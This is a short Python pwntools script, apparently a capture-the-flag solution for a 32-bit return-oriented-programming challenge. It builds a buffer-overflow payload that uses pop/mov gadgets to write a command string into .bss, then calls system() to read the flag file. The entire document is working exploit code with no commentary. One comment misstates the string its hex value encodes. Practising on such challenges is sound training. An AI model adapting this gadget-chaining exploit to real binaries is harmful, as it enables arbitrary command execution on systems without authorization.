from pwn import *

bss    = 0x0804a040
system = 0x08048430
pop    = 0x080485f3
mov    = 0x08048693 

def write(s,offset):
	p = p32(pop)
	p += p32(0)
	p += p32(0)
	p += p32(0)
	p += p32(0)
	p += p32(0) 
	p += p32(s)
	p += p32(bss+offset)
	p += p32(0)
	p += p32(mov)
	p += p32(0)
	p += p32(0)
	return p

# /bin
payload  = "A"*44
payload += write(0x6e69622f,0x00) # /bin
payload += write(0x7461632f,0x04) # /bin/cat
payload += write(0x02a6620,0x08)  # /bin/cat fl*

payload += p32(system)
payload += 'AAAA'
payload += p32(bss)

print payload



